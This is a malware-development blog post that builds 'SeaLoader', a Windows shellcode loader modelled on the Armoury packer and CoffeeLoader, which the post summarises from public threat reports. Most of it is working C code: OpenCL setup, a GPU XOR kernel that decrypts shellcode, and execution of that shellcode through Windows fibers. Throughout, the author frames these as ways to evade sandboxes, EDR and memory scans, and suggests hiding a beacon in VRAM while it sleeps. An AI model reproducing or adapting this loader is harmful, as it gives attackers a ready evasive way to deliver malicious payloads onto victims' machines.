---
title: Villain in the Vram
date: 2025-08-27
categories: [Maldev, C, Windows]
tags: [malware development, opencl, vram, fibers]
description: Using OpenCL for payload decryption
image:
  path: ../assets/img/maldev/sealoader/image.png
---

While researching ways to store and execute payloads on the CPU cache I stumbled upon this article from Zscaler's ThreatLabz: https://www.zscaler.com/blogs/security-research/coffeeloader-brew-stealthy-techniques, which describes CoffeeLoader and the Armoury packer. While Armoury uses OpenCL and Vram instead of the cpu cache like I was looking for, it still inspired me enough to put together a new loader using the technique and to make this post. The name "SeaLoader" is because of "CL", which kind of sounds like "Sea" I guess.

In this post I want to build a loader of my own that takes advantage of OpenCL and fibers to decrypt and execute shellcode. First we'll take a look at CoffeeLoader and the packer Armoury, then we can take what we see and build a PoC that mirrors some of the functionality.

We'll be using OpenCL, which gives us a vendor-neutral way to run a tiny decryption kernel on a GPU. If there is no GPU, program gracefully falls back to a CPU OpenCL device so the demo still runs.

Lastly, before getting started I want to clarify that when I use "Vram" I'm describing "Video Random Access Memory"(The memory of the GPU), as opposed to "Virtual Random Access Memory"(Page files, Swap). With that out of the way lets get into it!

## The Armoury Packer
---

The Armoury Packer, first observed in 2024, is a multi-stage packer named after its technique of hijacking an export function inside Asus Armoury Crate system software to bootstrap execution.

### Stages
---
The packer unfolds across eight stages. Odd-numbered stages carry out malicious actions, while even-numbered stages focus on decrypting and launching the next payload.

* **Stage I**: Hijacks the export function of Armoury Crate and runs the second-stage shellcode.
* **Stage II**: Decrypts and executes the third-stage PE file.
* **Stage III**: Decrypts and executes the fourth-stage shellcode using OpenCL.
* **Stage IV**: Decrypts and runs the fifth-stage PE file.
* **Stage V**: Elevates privileges and establishes persistence, and runs the sixth-stage shellcode.
* **Stage VI**: Decrypts and executes the seventh-stage PE file.
* **Stage VII**: Injects the eighth-stage shellcode into a 64-bit `dllhost.exe` process.
* **Stage VIII**: Loads and executes the final target payload.

Stage III stands out because it leverages an uncommon technique: GPU-assisted decryption. The host process sends an encoded buffer and a hardcoded XOR key to an OpenCL kernel, which performs decryption in parallel on the GPU. The decoded shellcode is then returned to the CPU and executed.

This design is a gamble: the loader assumes the target machine has OpenCL installed. If it does not, execution simply fails. While that limits its reach, it also complicates analysis, since most sandbox environments lack OpenCL support.

I recommend reading the following article to get a more in depth view of how exactly the packer works: https://www.antiy.net/Download/comprehensive-analysis-of-armouryloader-series-analysis-of-typical-loader-families-five.pdf

## CoffeeLoader
---
CoffeeLoader is a relatively new malware loader that is used to deploy second-stage payloads and evade detection by endpoint security solutions. It is known to be distributed via SmokeLoader.

Based on analysis, the CoffeeLoader attack process can be broken down into a few stages:
* **Dropper Execution**: After being unpacked, a dropper component is executed. It performs an installation routine. This includes setting file attributes to read-only, hidden, and system.
* **Stager Injection**: The dropper launches a stager component, which then injects the main CoffeeLoader module into a suspended `dllhost.exe` process.
* **Main Module Execution**: The main CoffeeLoader module resolves API function addresses using DJB2 hashes. It then uses its evasion tactics, such as call stack spoofing and sleep obfuscation, to remain undetected. The module communicates with a C2 server for tasks, which can include shellcode injection or executable deployment.

The interesting part of CoffeeLoader is its use of fibers, which are still relatively uncommon amoung malware.

## Examining the flow
---
As we've seen, both the Armoury Packer and CoffeeLoader are complex in their own right. But what makes them particularly dangerous is when they're deployed together. The Armoury Packer is a highly-evasive initial loader, while CoffeeLoader acts as the final payload, providing the attackers with a persistent backdoor. Together, they form a multi-stage attack chain that is difficult to trace and analyze.

```
Armoury
- Hijacks the export function of Armoury Crate
- Decrypts and executes the third-stage
- Decrypts the fourth-stage shellcode using OpenCL and executes
- Decrypts and runs the fifth-stage
- Elevates privileges and establishes persistence
- Decrypts and executes the seventh-stage
- Injects the eighth-stage into a dllhost.exe
- Launches CoffeeLoader

CoffeeLoader
- Install routine
- Launches stager
- Stager spawns dllhost.exe and injects main payload into it
- Communication with C2
```

## Building a custom version
---
The Zscaler article lists the following blog and PoC: https://eversinc33.com/posts/gpu-malware.html. The example is in C++ though, and I would rather code in C for this.

### Planning
---
The flow we're targetting will look like:
```
- Download Payload
- Load into Vram with OpenCL
- Run Decryption routine
- Copy out of memory
- Execute payload with fibers
```

### Initialize OpenCL and verify installation
---
First we're going to declare a struct to hold handles and information about the OpenCL installation.
```c
typedef struct {
    cl_context context;
    cl_command_queue queue;
    cl_program program;
    cl_kernel kernel;
    cl_platform_id platform_id;
    cl_device_id device_id;
    cl_uint num_devices;
    cl_uint num_platforms;
} OpenCL_Handles;
```

With the struct in place, we need a function to discover available devices, create a context, and set up a command queue. If a GPU isn’t available, we’ll attempt to fall back to the CPU.

```c
/**
 * @brief Initializes OpenCL by finding a platform and device, and creating a context and command queue.
 * @param handles Pointer to the OpenCL_Handles struct to be populated.
 * @return CL_SUCCESS on success, or an OpenCL error code on failure.
 */
cl_int init_opencl(OpenCL_Handles* handles) {
    cl_int err;

    // Platform Discovery
    err = clGetPlatformIDs(1, &handles->platform_id, &handles->num_platforms);
    if (err == CL_PLATFORM_NOT_FOUND_KHR) {
        fprintf(stderr, "[-] No OpenCL platforms found. Check installation.\n");
        return err;
    }
    CHECK_CL_ERROR(err, "clGetPlatformIDs");

    // Device Discovery
    err = clGetDeviceIDs(handles->platform_id, CL_DEVICE_TYPE_GPU, 1, &handles->device_id, &handles->num_devices);
    if (err == CL_DEVICE_NOT_FOUND) { // Fallback to CPU if no GPU is found
        printf("[!] No GPU found. Trying CPU...\n");
        err = clGetDeviceIDs(handles->platform_id, CL_DEVICE_TYPE_CPU, 1, &handles->device_id, &handles->num_devices);
        if (err == CL_DEVICE_NOT_FOUND) {
            fprintf(stderr, "[-] No OpenCL devices (GPU or CPU) found.\n");
            return err;
        }
    }
    CHECK_CL_ERROR(err, "clGetDeviceIDs");

    // Create Context and Command Queue
    handles->context = clCreateContext(NULL, 1, &handles->device_id, NULL, NULL, &err);
    CHECK_CL_ERROR(err, "clCreateContext");

    handles->queue = clCreateCommandQueueWithProperties(handles->context, handles->device_id, NULL, &err);
    CHECK_CL_ERROR(err, "clCreateCommandQueueWithProperties");

    printf("[+] OpenCL initialized successfully.\n");
    return CL_SUCCESS;
}
```

Lets go through the important bits:

1. **Discover an OpenCL platform**
```c
err = clGetPlatformIDs(1, &handles->platform_id, &handles->num_platforms);
```
clGetPlatformIDs asks the installed OpenCL ICD loader for available vendors.
You request a single platform and capture the count in num_platforms.
If you get CL_PLATFORM_NOT_FOUND_KHR, there is no OpenCL runtime on the box.

2. **Pick a device**
```c
err = clGetDeviceIDs(handles->platform_id, CL_DEVICE_TYPE_GPU, 1, &handles->device_id, &handles->num_devices);
if (err == CL_DEVICE_NOT_FOUND) {
    // fallback to CPU
    err = clGetDeviceIDs(handles->platform_id, CL_DEVICE_TYPE_CPU, 1, &handles->device_id, &handles->num_devices);
}
```
Try a GPU first. If none are present or enabled, we request a CPU device from the same platform. This matches the gamble mentioned above. If a GPU exists, you get VRAM backed buffers. If not, the code still runs, but your buffers are in system RAM behind a CPU OpenCL runtime.

3. **Create a context**
```c
handles->context = clCreateContext(NULL, 1, &handles->device_id, NULL, NULL, &err);
```
The context binds your chosen device to the resources you will create next. You pass NULL for properties and callback, which keeps it simple and portable.

Now that we have a working OpenCL environment, the next logical step is to write a kernel. A kernel is the code that the GPU will actually run. We'll write a simple decryption kernel that performs a parallel XOR operation on an input buffer, mimicking the core functionality of Armoury Packer's Stage III.

### Decryption Routine
---
```c
/**
 * @brief Creates buffers, builds and runs the XOR decryption kernel.
 * @param handles Pointer to the initialized OpenCL_Handles struct.
 * @param encryptedShellcode The raw encrypted data downloaded from the URL.
 * @param dataSize The size of the encrypted data.
 * @param key The XOR key to use for decryption.
 * @param decryptedShellcode Output buffer to store the decrypted result.
 * @return CL_SUCCESS on success, or an OpenCL error code on failure.
 */
cl_int run_decryption_kernel(OpenCL_Handles* handles, const BYTE* encryptedShellcode, size_t dataSize, const char* key, BYTE* decryptedShellcode) {
    cl_int err;
    const unsigned int keyLength = (unsigned int)strlen(key);

    const char* xorKernelSource =
        "__kernel void decrypt(__global const unsigned char* encryptedData, \n"
        "                      __global const char* xorKey, \n"
        "                      __global unsigned char* decryptedData, \n"
        "                      const unsigned int keyLength) \n"
        "{ \n"
        "    int gid = get_global_id(0); \n"
        "    if (keyLength > 0) { \n"
        "        decryptedData[gid] = encryptedData[gid] ^ xorKey[gid % keyLength]; \n"
        "    } \n"
        "} \n";

    // Create and Build Program
    handles->program = clCreateProgramWithSource(handles->context, 1, &xorKernelSource, NULL, &err);
    CHECK_CL_ERROR(err, "clCreateProgramWithSource");

    err = clBuildProgram(handles->program, 1, &handles->device_id, NULL, NULL, NULL);
    if (err != CL_SUCCESS) {
        fprintf(stderr, "[-] Kernel build failed.\n");
        print_build_log(handles->program, handles->device_id);
        return err;
    }

    handles->kernel = clCreateKernel(handles->program, "decrypt", &err);
    CHECK_CL_ERROR(err, "clCreateKernel");

    // Create Device Buffers
    cl_mem dev_encrypted_in = clCreateBuffer(handles->context, CL_MEM_READ_ONLY | CL_MEM_COPY_HOST_PTR, dataSize, (void*)encryptedShellcode, &err);
    CHECK_CL_ERROR(err, "clCreateBuffer (encrypted_in)");
    cl_mem dev_key_in = clCreateBuffer(handles->context, CL_MEM_READ_ONLY | CL_MEM_COPY_HOST_PTR, keyLength, (void*)key, &err);
    CHECK_CL_ERROR(err, "clCreateBuffer (key_in)");
    cl_mem dev_decrypted_out = clCreateBuffer(handles->context, CL_MEM_WRITE_ONLY, dataSize, NULL, &err);
    CHECK_CL_ERROR(err, "clCreateBuffer (decrypted_out)");

    // Set Kernel Arguments
    clSetKernelArg(handles->kernel, 0, sizeof(cl_mem), &dev_encrypted_in);
    clSetKernelArg(handles->kernel, 1, sizeof(cl_mem), &dev_key_in);
    clSetKernelArg(handles->kernel, 2, sizeof(cl_mem), &dev_decrypted_out);
    clSetKernelArg(handles->kernel, 3, sizeof(unsigned int), &keyLength);

    // Execute Kernel
    err = clEnqueueNDRangeKernel(handles->queue, handles->kernel, 1, NULL, &dataSize, NULL, 0, NULL, NULL);
    CHECK_CL_ERROR(err, "clEnqueueNDRangeKernel");

    // Read Result Back
    err = clEnqueueReadBuffer(handles->queue, dev_decrypted_out, CL_TRUE, 0, dataSize, decryptedShellcode, 0, NULL, NULL);
    CHECK_CL_ERROR(err, "clEnqueueReadBuffer");

    // Cleanup
    clReleaseMemObject(dev_encrypted_in);
    clReleaseMemObject(dev_key_in);
    clReleaseMemObject(dev_decrypted_out);

    return CL_SUCCESS;
}
```

Now let's go through the key parts of the decryption routine to understand what's happening.

1. **The Kernel Source**
```c
const char* xorKernelSource =
    "__kernel void decrypt(__global const unsigned char* encryptedData, \n"
    "                      __global const char* xorKey, \n"
    "                      __global unsigned char* decryptedData, \n"
    "                      const unsigned int keyLength) \n"
    "{ \n"
    "    int gid = get_global_id(0); \n"
    "    if (keyLength > 0) { \n"
    "        decryptedData[gid] = encryptedData[gid] ^ xorKey[gid % keyLength]; \n"
    "    } \n"
    "} \n";
```
The xorKernelSource is a C string that contains the actual code that will run on the GPU. This is the OpenCL kernel. This is a simple XOR implementation that supports variable key length. The get_global_id(0) function returns a unique ID for each parallel thread running the kernel, allowing each thread to process a single byte of the encrypted data.

2. **Creating and Building the Program**
```c
handles->program = clCreateProgramWithSource(handles->context, 1, &xorKernelSource, NULL, &err);
err = clBuildProgram(handles->program, 1, &handles->device_id, NULL, NULL, NULL);
```
The clCreateProgramWithSource function takes our kernel source string and creates an OpenCL program object. We then call clBuildProgram to compile this program for our chosen device. This is the equivalent of compiling C code for the CPU; it translates the OpenCL C code into machine code that the GPU can understand and execute. If the build fails, we use a helper function to print the build log, which is a crucial step for debugging kernel-related issues.

3. **Creating Device Buffers**
```c
cl_mem dev_encrypted_in = clCreateBuffer(handles->context, CL_MEM_READ_ONLY | CL_MEM_COPY_HOST_PTR, dataSize, (void*)encryptedShellcode, &err);
cl_mem dev_key_in = clCreateBuffer(handles->context, CL_MEM_READ_ONLY | CL_MEM_COPY_HOST_PTR, keyLength, (void*)key, &err);
cl_mem dev_decrypted_out = clCreateBuffer(handles->context, CL_MEM_WRITE_ONLY, dataSize, NULL, &err);
```
Before the kernel can run, the data must be transferred from the host (CPU) to the device (GPU). We use clCreateBuffer to create three memory objects (cl_mem) on the device. dev_encrypted_in and dev_key_in are created as read-only and a copy of the host data is made. dev_decrypted_out is created as a write-only buffer, and it will hold the final decrypted data.

4. **Setting Kernel Arguments**
```c
clSetKernelArg(handles->kernel, 0, sizeof(cl_mem), &dev_encrypted_in);
clSetKernelArg(handles->kernel, 1, sizeof(cl_mem), &dev_key_in);
clSetKernelArg(handles->kernel, 2, sizeof(cl_mem), &dev_decrypted_out);
clSetKernelArg(handles->kernel, 3, sizeof(unsigned int), &keyLength);
```
With the memory objects created, we use clSetKernelArg to bind the buffers and scalar values to their corresponding arguments in the kernel. This links the host's data structures to the device's memory spaces, allowing the kernel to access the encrypted data, the key, and the output buffer.

5. **Executing the Kernel**
```c
err = clEnqueueNDRangeKernel(handles->queue, handles->kernel, 1, NULL, &dataSize, NULL, 0, NULL, NULL);
```
The clEnqueueNDRangeKernel function is the most important part of this section. It enqueues the kernel for execution on the device. The &dataSize argument tells OpenCL how many work items (threads) to launch. Since each thread processes a single byte, we set the global work size to the total size of the encrypted data. This is what allows for the parallel decryption—a separate thread is launched for every byte.

6. **Reading the Result Back**
```c
err = clEnqueueReadBuffer(handles->queue, dev_decrypted_out, CL_TRUE, 0, dataSize, decryptedShellcode, 0, NULL, NULL);
```
After the kernel finishes execution, the decrypted data is still on the GPU. We use clEnqueueReadBuffer to copy the data from the dev_decrypted_out buffer on the device back into the decryptedShellcode buffer on the host. The CL_TRUE flag ensures this operation is blocking, meaning the function will not return until the data has been successfully copied.

With the decryption routine complete, we now have all the pieces needed to re-create the core functionality of Armoury Packer's Stage III. The next step is execution.

## Execution with Fibers
---
From the Zscaler article:
> CoffeeLoader has an option to use Windows fibers to implement sleep obfuscation as yet another way to evade detection, since some EDRs may not directly monitor or track them.

Rather than sleep obfuscation, we're going to use fibers to detonate our newly decrypted payload.

```c
/**
 * @brief Executes shellcode with fibers.
 * @param instance Instance with pointers to ntdll functions.
 * @param shellcode The shellcode to execute.
 * @param shellcodeSize The size of the shellcode.
 * @return 0 on success, or 1 on failure.
 */
BOOL ExecuteWithFibers(INSTANCE instance, PBYTE shellcode, DWORD shellcodeSize) {
    BOOL result = FALSE;
    PVOID shellcodeExec = NULL;
    HANDLE hProcess = NtCurrentProcess();
    SIZE_T regionSize = shellcodeSize;
    ULONG oldProtect;
    NTSTATUS status;

    // Convert the main thread to a fiber.
    PVOID mainFiber = ConvertThreadToFiber("MainThreadFiber");
    if (!mainFiber) {
        printf("[-] Failed to convert thread to fiber.\n");
        return 1;
    }

    // Allocate executable memory for the shellcode.
    status = instance.Api.NtAllocateVirtualMemory(hProcess, &shellcodeExec, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (status != 0) {
        printf("[-] NtAllocateVirtualMemory failed: 0x%X\n", status);
        return 1;
    }

    printf("[+] Allocated memory at: 0x%p\n", shellcodeExec);

    // Copy the shellcode to the newly allocated memory.
    memcpy(shellcodeExec, shellcode, shellcodeSize);
    printf("[+] Copied shellcode to memory.\n");

    status = instance.Api.NtProtectVirtualMemory(hProcess, &shellcodeExec, &regionSize, PAGE_EXECUTE_READ, &oldProtect);
    if (status != 0) {
        printf("[-] NtProtectVirtualMemory failed: 0x%X\n", status);
        return 1;
    }

    // Cast the executable memory address to a function pointer.
    void (*shellcodeFunc)(void*) = (void (*)(void*))shellcodeExec;

    // Create a fiber that will execute the shellcode.
    PVOID shellcodeFiber = CreateFiber((SIZE_T)1024 * 64, shellcodeFunc, NULL);
    if (!shellcodeFiber) {
        printf("[-] CreateFiber for shellcode failed.\n");
        VirtualFree(shellcodeExec, 0, MEM_RELEASE);
        return 1;
    }
    printf("[+] Shellcode Fiber Created At Address: 0x%p \n", shellcodeFiber);

    // Switch to the shellcode fiber to execute it.
    printf("[+] Switching to shellcode fiber.\n");
    SwitchToFiber(shellcodeFiber);

    // The program probably won't reach this point, as the shellcode
    // typically calls ExitProcess or does not return.
    printf("[!] Returned from shellcode fiber.\n");

    // Clean up resources.
    DeleteFiber(shellcodeFiber);
    VirtualFree(shellcodeExec, 0, MEM_RELEASE);
}
```
And here's a rundown on this function as well:

1. **Converting the Main Thread to a Fiber**
```c
PVOID mainFiber = ConvertThreadToFiber("MainThreadFiber");
```
The first step is to call ConvertThreadToFiber(). Unlike traditional threads, fibers cannot be executed directly by the operating system scheduler. Instead, they must be manually managed. This function prepares the main thread to manage and switch to other fibers. The mainFiber handle allows the program to switch back to the main thread if needed. If this step fails, it's a critical error as the program won't be able to manage the shellcode fiber.

2. **Creating a Fiber**
```c
PVOID shellcodeFiber = CreateFiber((SIZE_T)1024 * 64, shellcodeFunc, NULL);
```
With the main thread converted, we can now create the fiber that will run our shellcode using CreateFiber(). The first argument is the stack size for the fiber. The second argument is a function pointer to the code that the fiber will execute, which in our case is the address of our newly decrypted shellcode. The final argument is a pointer to any data we want to pass to the fiber. Here, we pass NULL since the shellcode doesn't require any arguments. This function returns a handle to the new fiber.

3. **Switching to the Shellcode Fiber to Execute**
```c
SwitchToFiber(shellcodeFiber);
```
This is what actually starts the execution of the shellcode. This function performs a context switch, saving the current state of the main fiber and loading the saved state of the shellcodeFiber. The execution flow then jumps to the starting address of the shellcode. Since most shellcode payloads are designed to be a one-way street, they typically won't return to the main thread, but if they did, the program would continue from the line directly after SwitchToFiber().

You can find out more about using fibers to execute shellcode here: https://oblivion-malware.xyz/posts/shellcode-pt4-stager-local-inject-fibers/

Or on Maldev Academy.

## Conclusion
---
And that wraps up our look at fiber based execution and GPU assisted decryption with OpenCL. I'm still working on my blog creating abilities, but hopefully there's still something useful or interesting here for you.

There's a couple other PoCs out there already, such as Jellyfish and GPUAbuser-Malware.

* https://github.com/AbdouRoumi/GpuAbuser-Malware/tree/master
* https://github.com/nwork/WIN_JELLY/tree/master

I think that a better use for this technique than decrypting shellcode would be to hide a beacon during its sleep. Most memory scans don't touch Vram, and even if they did the data can still be encrypted either before or once it's moved into Vram.

You can find the full source of the project here:
* https://github.com/P0142/SeaLoader

Unfortunately this technique won't work in most labs, due to the OpenCL requirement.

This next maldev post will either be stack spoofing, a custom fiber implementation, or user-mode cpu cache execution if I can figure it out.

## Sources
---
* https://www.zscaler.com/blogs/security-research/coffeeloader-brew-stealthy-techniques
* https://eversinc33.com/posts/gpu-malware.html
* https://www.4hou.com/posts/xyE9
* https://www.antiy.net/Download/comprehensive-analysis-of-armouryloader-series-analysis-of-typical-loader-families-five.pdf
